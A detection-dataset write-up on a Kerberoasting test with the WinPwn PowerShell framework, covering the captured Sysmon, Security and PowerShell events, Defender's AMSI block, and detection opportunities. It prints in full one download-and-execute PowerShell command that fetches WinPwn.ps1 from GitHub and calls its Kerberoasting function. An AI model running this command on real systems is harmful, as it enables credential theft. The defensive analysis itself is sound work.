# T1558.003-6: Kerberoasting — WinPwn - Kerberoasting

## Technique Context

Kerberoasting (T1558.003) is frequently embedded in broader post-exploitation frameworks. WinPwn is a PowerShell-based offensive framework that aggregates multiple Windows attack techniques into a single script. The `Kerberoasting` function within WinPwn wraps kerberoast functionality (ultimately backed by Rubeus or similar) behind a consistent interface. This test downloads WinPwn directly from GitHub and invokes its `Kerberoasting` function with `-consoleoutput -noninteractive` flags to suppress interactive prompts and print results.

## What This Dataset Contains

The dataset spans approximately 9 seconds on 2026-03-14 from ACME-WS02 (acme.local domain) and contains 102 events across Sysmon, Security, and PowerShell channels.

**The attack command**, captured in Security 4688 and PowerShell 4104:
```
powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Kerberoasting -consoleoutput -noninteractive}
```

**Defender blocked execution.** PowerShell 4100 records the error:
> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

The error message text indicates the block: `# Global TLS Setting for all functions. If TLS12 isn't supported yo...` — the first line of the WinPwn.ps1 script was presented to AMSI, which flagged it immediately, before the `Kerberoasting` function could be called.

**Process chain** (Security 4688):
1. `whoami.exe` — ART test framework pre-check
2. `powershell.exe` — child process downloading and executing WinPwn

**Sysmon events include:**
- Event 1: `whoami.exe` (T1033) and `powershell.exe` (T1059.001)
- Event 7: .NET CLR assembly loads into PowerShell (`mscoree.dll`, `clr.dll`, GAC assemblies)
- Event 10: PowerShell accessing child processes (T1055.001 pattern)
- Event 11: PowerShell startup profile data file writes
- Event 17: `\PSHost.*` named pipes
- Event 22 (DNS Query): One DNS query was captured — likely triggered by the `net.webclient` download attempt before the block

**PowerShell 4104** captures both the outer `& { iex(...) Kerberoasting ... }` wrapper and the raw inner body. A 4100 error event captures the block.

## What This Dataset Does Not Contain (and Why)

**No WinPwn content in script blocks.** Defender's AMSI integration blocked the downloaded content before PowerShell finished compiling the script block. The 4104 event captures the `iex(...)` invocation itself but not the WinPwn function bodies — those were blocked before the script block could be fully formed.

**No Kerberos ticket requests.** The WinPwn `Kerberoasting` function never executed. No Security 4769 events.

**No network connection to GitHub.** While the `net.webclient.downloadstring()` call was initiated, the Sysmon 22 DNS query (if captured) would reflect the network resolution attempt. However, it is also possible the AMSI block happened before the download completed — the dataset shows only one DNS event versus three in tests 1 and 7 where Defender triggered cloud queries.

## Assessment

Defender blocked WinPwn at the AMSI layer when the downloaded script was evaluated by `iex`. This mirrors test 1's block of `Invoke-Kerberoast` and reflects Defender's signature coverage for known offensive PowerShell frameworks. The dataset is valuable as an example of a download-and-execute kerberoasting attempt using a named framework, where the detection point is earlier in the execution chain than the actual technique. The full command line is preserved including the specific WinPwn commit hash, which is a meaningful indicator.

## Detection Opportunities Present in This Data

- **Security 4688 / Sysmon 1**: `powershell.exe` command line with `iex(new-object net.webclient).downloadstring(...)` referencing `WinPwn.ps1` from GitHub — URL and function name are distinct indicators
- **PowerShell 4104**: Script block logging captures the `iex(...)` call before AMSI blocks it, including the full GitHub URL with commit hash
- **PowerShell 4100**: `ScriptContainedMaliciousContent` error — Defender's explicit AMSI block event, with the first line of WinPwn.ps1 in the error context
- **Behavioral**: `net.webclient.downloadstring()` feeding directly into `iex` is a classic living-off-the-land download-and-execute pattern regardless of the payload
- **Sysmon 3**: `MsMpEng.exe` outbound connections at the time of detection — Defender cloud telemetry activity
